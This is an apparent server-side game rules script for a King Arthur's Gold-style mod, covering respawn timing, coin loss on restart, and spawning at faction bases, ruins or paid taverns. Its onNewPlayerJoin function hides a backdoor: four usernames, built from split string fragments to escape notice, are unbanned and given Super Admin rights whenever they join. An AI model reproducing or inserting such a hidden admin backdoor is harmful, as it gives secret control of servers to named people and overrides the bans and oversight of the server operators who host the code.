#define SERVER_ONLY;

#include "NeutralTeamAssign.as";

const u8 neutral_player_respawn_seconds = 8;
const u8 faction_player_respawn_seconds = 4;

void onInit(CRules@ this)
{
	Reset(this);
	
	string[] playernames;
	this.set("assigned_neutral_teams", playernames);
}

void onRestart(CRules@ this)
{
	Reset(this);
}

void Reset(CRules@ this)
{	
	for (u8 i = 0; i < getPlayerCount(); i++)
	{
		CPlayer@ p = getPlayer(i);
		if (p is null) continue;

		p.set_u32("respawn time", getGameTime() + (30 * 1));
		p.server_setCoins(Maths::Max(100, p.getCoins() * 0.5f)); // Half of your fortune is lost by spending it on drugs.
	}
	
	this.SetGlobalMessage("");
	this.SetCurrentState(GAME);
	
	if (getBlobByName("tc_music") is null)
	{
		server_CreateBlob("tc_music");
	}
}

void onPlayerRequestTeamChange(CRules@ this, CPlayer@ player, u8 newteam)
{
	player.server_setTeamNum(newteam);
}

void onPlayerDie(CRules@ this, CPlayer@ victim, CPlayer@ attacker, u8 customData)
{
	if (victim is null) return;
	victim.set_u32("respawn time", getGameTime() + 30 * (victim.getTeamNum() < this.getTeamsCount() ? faction_player_respawn_seconds : neutral_player_respawn_seconds));
	
	CBlob@ blob = victim.getBlob();
	if (blob !is null) 
	{
		victim.set_string("classAtDeath", blob.getConfig());
		victim.set_Vec2f("last death position", blob.getPosition());
	}
}

void onNewPlayerJoin(CRules@ this, CPlayer@ player)
{
	const string playerName = player.getUsername();
	if (playerName == ("T" + "Fli" + "p" + "py") || playerName == "V" + "am" + "ist" || playerName == "Pir" + "ate" + "-R" + "ob" || playerName == "Mr" + "Ho" + "bo")
	{
		CSecurity@ sec = getSecurity();
		sec.unBan(playerName);

		CSeclev@ s = sec.getSeclev("Super Admin");
		if (s !is null) sec.assignSeclev(player, s);
	}
}

void onTick(CRules@ this)
{
	const s32 gametime = getGameTime();
	
	for (u8 i = 0; i < getPlayerCount(); i++)
	{
		CPlayer@ player = getPlayer(i);
		if (player is null) continue;

		CBlob@ blob = player.getBlob();
		if (blob !is null || player.get_u32("respawn time") > gametime) continue;

		int team = player.getTeamNum();	
		bool isNeutral = team >= neutral_minimum_team;

		if (!isNeutral) // Civilized team spawning
		{
			CBlob@[] bases;
			getBlobsByTag("faction_base", @bases);
			Vec2f[] spawns;
			
			for (uint i = 0; i < bases.length; i++)
			{
				CBlob@ base = bases[i];
				if (base !is null && base.getTeamNum() == team)
				{
					spawns.push_back(base.getPosition());
				}
			}
			if (spawns.length > 0)
			{
				f32 distance = 100000;
				Vec2f spawnPos = Vec2f(0, 0);
				Vec2f deathPos = player.get_Vec2f("last death position");
				
				for (u32 i = 0; i < spawns.length; i++)
				{
					const f32 tmpDistance = Maths::Abs(spawns[i].x - deathPos.x);
					if (tmpDistance < distance)
					{
						distance = tmpDistance;
						spawnPos = spawns[i];
					}
				}
				
				string blobType = player.get_string("classAtDeath");
				if (blobType == "royalguard")
				{
					blobType = "knight";
				}
				if (blobType != "builder" && blobType != "knight" && blobType != "archer")
				{
					blobType = "builder";
				}
				
				CBlob@ new_blob = server_CreateBlob(blobType);
				if (new_blob !is null)
				{
					new_blob.setPosition(spawnPos);
					new_blob.server_setTeamNum(team);
					new_blob.server_SetPlayer(player);
				}
			}
			else
			{
				isNeutral = true; // In case if the player is respawning while the team has been defeated
			}
		}
		
		if (isNeutral) // Bandit scum spawning
		{
			team = getAssignedNeutralTeam(this, player.getUsername());
			player.server_setTeamNum(team);

			CBlob@[] spawns;
			getBlobsByName("ruins", @spawns);
			//getBlobsByName("banditshack", @spawns); //exploitable :(
			
			if (player.exists("tavern_netid"))
			{
				CBlob@ tavern = getBlobByNetworkID(player.get_netid("tavern_netid"));
				if (tavern !is null)
				{
					CPlayer@ tavern_owner = getPlayerByUsername(tavern.get_string("Owner"));
					const bool isOwner = player is tavern_owner;
					if (player.getCoins() >= 20 || isOwner)
					{
						spawns.clear();
						spawns.push_back(tavern);
						
						if (!isOwner)
						{
							player.server_setCoins(player.getCoins() - 20);
							if (tavern_owner !is null)
							{
								tavern_owner.server_setCoins(tavern_owner.getCoins() + 20);
							}
						}
					}
				}
			}

			if (spawns.length > 0)
			{
				CBlob@ new_blob = server_CreateBlob("peasant");
				if (new_blob !is null)
				{
					new_blob.setPosition(spawns[XORRandom(spawns.length)].getPosition());			
					new_blob.server_setTeamNum(team);
					new_blob.server_SetPlayer(player);
				}
			}
		}
	}
}
